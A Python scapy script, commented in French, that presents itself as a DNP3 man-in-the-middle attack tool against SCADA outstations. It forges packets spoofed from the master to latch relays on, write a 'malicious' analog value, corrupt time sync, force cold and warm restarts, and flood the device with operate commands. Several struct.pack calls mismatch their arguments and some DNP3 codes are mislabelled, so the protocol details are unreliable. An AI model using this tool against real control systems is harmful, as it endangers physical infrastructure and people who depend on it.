from scapy.all import *
import struct
import time

# Configuration réseau
ip_master = "192.168.1.100"  # HMI/SCADA
ip_outstation = "192.168.1.40"  # Outstation (RTU/IED)
sport = 20000                # Port DNP3 standard
dport = 20000
seq_num = 100000
ack_num = 200000

# DNP3 - Application Layer Write Request
def create_dnp3_write_request():
    # En-tête DNP3 Application Layer
    app_control = 0xC0        # Application control (FIR=1, FIN=1, CON=0, UNS=0)
    function_code = 0x02      # Write
    internal_indications = 0x00
    
    # Object Header
    object_group = 0x20       # Binary Output
    object_variation = 0x01   # Control Relay Output Block
    qualifier = 0x17          # 8-bit start/stop/operate/code/count/time/interval
    
    # Control Relay Output Block
    control_code = 0x41       # LATCH_ON
    count = 0x01              # Count
    on_time = 0x0000          # On time
    off_time = 0x0000         # Off time
    
    # Index
    index = 0x0001            # Point index
    
    # Construction du payload
    payload = struct.pack(">BBBBBBHHH",
        app_control,
        function_code,
        internal_indications,
        object_group,
        object_variation,
        qualifier,
        control_code,
        count,
        on_time,
        off_time,
        index
    )
    
    return payload

# DNP3 - Application Layer Read Request
def create_dnp3_read_request():
    app_control = 0xC0        # Application control
    function_code = 0x01      # Read
    internal_indications = 0x00
    
    # Object Header
    object_group = 0x01       # Binary Input
    object_variation = 0x00   # Static
    qualifier = 0x06          # 8-bit start/stop
    
    # Range
    start_index = 0x0000
    stop_index = 0x000F       # Read 16 points
    
    payload = struct.pack(">BBBBHH",
        app_control,
        function_code,
        internal_indications,
        object_group,
        object_variation,
        qualifier,
        start_index,
        stop_index
    )
    
    return payload

# DNP3 - Direct Operate Request (Commande directe)
def create_dnp3_direct_operate():
    app_control = 0xC0
    function_code = 0x05      # Direct Operate
    internal_indications = 0x00
    
    # Object Header
    object_group = 0x0C       # Binary Output
    object_variation = 0x01   # Control Relay Output Block
    qualifier = 0x17
    
    # Control Relay Output Block
    control_code = 0x41       # LATCH_ON
    count = 0x01
    on_time = 0x0000
    off_time = 0x0000
    
    # Index
    index = 0x0001
    
    payload = struct.pack(">BBBBBBHHH",
        app_control,
        function_code,
        internal_indications,
        object_group,
        object_variation,
        qualifier,
        control_code,
        count,
        on_time,
        off_time,
        index
    )
    
    return payload

# DNP3 - Select and Operate Request (Sélection et commande)
def create_dnp3_select_operate():
    app_control = 0xC0
    function_code = 0x03      # Select
    internal_indications = 0x00
    
    # Object Header
    object_group = 0x0C       # Binary Output
    object_variation = 0x01   # Control Relay Output Block
    qualifier = 0x17
    
    # Control Relay Output Block
    control_code = 0x41       # LATCH_ON
    count = 0x01
    on_time = 0x0000
    off_time = 0x0000
    
    # Index
    index = 0x0001
    
    payload = struct.pack(">BBBBBBHHH",
        app_control,
        function_code,
        internal_indications,
        object_group,
        object_variation,
        qualifier,
        control_code,
        count,
        on_time,
        off_time,
        index
    )
    
    return payload

# DNP3 - Cold Restart Request
def create_dnp3_cold_restart():
    app_control = 0xC0
    function_code = 0x0D      # Cold Restart
    internal_indications = 0x00
    
    # Object Header
    object_group = 0x0D       # Device Attributes
    object_variation = 0x00   # File-Transport
    qualifier = 0x00
    
    payload = struct.pack(">BBBB",
        app_control,
        function_code,
        internal_indications,
        object_group,
        object_variation,
        qualifier
    )
    
    return payload

# DNP3 - Warm Restart Request
def create_dnp3_warm_restart():
    app_control = 0xC0
    function_code = 0x0E      # Warm Restart
    internal_indications = 0x00
    
    # Object Header
    object_group = 0x0D       # Device Attributes
    object_variation = 0x00   # File-Transport
    qualifier = 0x00
    
    payload = struct.pack(">BBBB",
        app_control,
        function_code,
        internal_indications,
        object_group,
        object_variation,
        qualifier
    )
    
    return payload

# DNP3 - Write Analog Output
def create_dnp3_write_analog():
    app_control = 0xC0
    function_code = 0x02      # Write
    internal_indications = 0x00
    
    # Object Header
    object_group = 0x30       # Analog Output
    object_variation = 0x01   # 32-bit with flag
    qualifier = 0x17
    
    # Analog Output
    flags = 0x01              # Online
    value = struct.pack(">f", 999.99)  # Valeur malveillante
    
    # Index
    index = 0x0001
    
    payload = struct.pack(">BBBBBB",
        app_control,
        function_code,
        internal_indications,
        object_group,
        object_variation,
        qualifier,
        flags
    ) + value + struct.pack(">H", index)
    
    return payload

# DNP3 - Time Sync Request
def create_dnp3_time_sync():
    app_control = 0xC0
    function_code = 0x18      # Time and Date
    internal_indications = 0x00
    
    # Object Header
    object_group = 0x32       # Time and Date
    object_variation = 0x01   # Absolute time
    qualifier = 0x07          # 8-bit count
    
    # Count
    count = 0x01
    
    # Time (timestamp malveillant - année 1900)
    time_value = struct.pack(">Q", 0x0000000000000000)
    
    payload = struct.pack(">BBBBBB",
        app_control,
        function_code,
        internal_indications,
        object_group,
        object_variation,
        qualifier,
        count
    ) + time_value
    
    return payload

# Fonction d'attaque MITM
def dnp3_mitm_attack():
    print("[+] Démarrage de l'attaque DNP3 MITM...")
    
    # 1. Lecture des données
    print("[+] Phase 1: Lecture des données...")
    read_payload = create_dnp3_read_request()
    ip = IP(src=ip_master, dst=ip_outstation)
    tcp = TCP(sport=sport, dport=dport, flags="PA", seq=seq_num, ack=ack_num)
    read_packet = ip / tcp / Raw(load=read_payload)
    send(read_packet, verbose=1)
    
    time.sleep(1)
    
    # 2. Commande directe malveillante
    print("[+] Phase 2: Commande directe malveillante...")
    direct_payload = create_dnp3_direct_operate()
    tcp.seq += len(read_payload)
    tcp.ack += 1
    direct_packet = ip / tcp / Raw(load=direct_payload)
    send(direct_packet, verbose=1)
    
    time.sleep(1)
    
    # 3. Sélection et commande
    print("[+] Phase 3: Sélection et commande...")
    select_payload = create_dnp3_select_operate()
    tcp.seq += len(direct_payload)
    tcp.ack += 1
    select_packet = ip / tcp / Raw(load=select_payload)
    send(select_packet, verbose=1)
    
    time.sleep(1)
    
    # 4. Modification de sortie analogique
    print("[+] Phase 4: Modification de sortie analogique...")
    analog_payload = create_dnp3_write_analog()
    tcp.seq += len(select_payload)
    tcp.ack += 1
    analog_packet = ip / tcp / Raw(load=analog_payload)
    send(analog_packet, verbose=1)
    
    time.sleep(1)
    
    # 5. Attaque de synchronisation temporelle
    print("[+] Phase 5: Attaque de synchronisation temporelle...")
    time_payload = create_dnp3_time_sync()
    tcp.seq += len(analog_payload)
    tcp.ack += 1
    time_packet = ip / tcp / Raw(load=time_payload)
    send(time_packet, verbose=1)
    
    time.sleep(1)
    
    # 6. Attaque de redémarrage
    print("[+] Phase 6: Attaque de redémarrage...")
    restart_payload = create_dnp3_cold_restart()
    tcp.seq += len(time_payload)
    tcp.ack += 1
    restart_packet = ip / tcp / Raw(load=restart_payload)
    send(restart_packet, verbose=1)
    
    print("[+] Attaque DNP3 terminée!")

# Fonction d'attaque par flooding
def dnp3_flooding_attack():
    print("[+] Attaque DNP3 flooding...")
    
    # Envoi massif de commandes directes
    for i in range(100):
        direct_payload = create_dnp3_direct_operate()
        ip = IP(src=ip_master, dst=ip_outstation)
        tcp = TCP(sport=sport, dport=dport, flags="PA", seq=seq_num+i, ack=ack_num+i)
        packet = ip / tcp / Raw(load=direct_payload)
        send(packet, verbose=0)
        time.sleep(0.01)
    
    print("[+] Attaque flooding terminée!")

# Fonction de reconnaissance
def dnp3_reconnaissance():
    print("[+] Reconnaissance DNP3...")
    
    # Tentative de lecture
    read_payload = create_dnp3_read_request()
    
    ip = IP(src=ip_master, dst=ip_outstation)
    tcp = TCP(sport=sport, dport=dport, flags="PA", seq=seq_num, ack=ack_num)
    packet = ip / tcp / Raw(load=read_payload)
    
    send(packet, verbose=1)
    print("[+] Paquet de reconnaissance envoyé")

# Fonction d'attaque de redémarrage
def dnp3_restart_attack():
    print("[+] Attaque de redémarrage DNP3...")
    
    # Envoi de commandes de redémarrage
    for i in range(5):
        restart_payload = create_dnp3_warm_restart()
        ip = IP(src=ip_master, dst=ip_outstation)
        tcp = TCP(sport=sport, dport=dport, flags="PA", seq=seq_num+i, ack=ack_num+i)
        packet = ip / tcp / Raw(load=restart_payload)
        send(packet, verbose=1)
        time.sleep(1)
    
    print("[+] Attaque de redémarrage terminée!")

if __name__ == "__main__":
    print("=== DNP3 MITM Attack Tool ===")
    print("1. Reconnaissance")
    print("2. Attaque complète")
    print("3. Attaque flooding")
    print("4. Attaque de redémarrage")
    
    choice = input("Choix (1/2/3/4): ")
    
    if choice == "1":
        dnp3_reconnaissance()
    elif choice == "2":
        dnp3_mitm_attack()
    elif choice == "3":
        dnp3_flooding_attack()
    elif choice == "4":
        dnp3_restart_attack()
    else:
        print("Choix invalide")
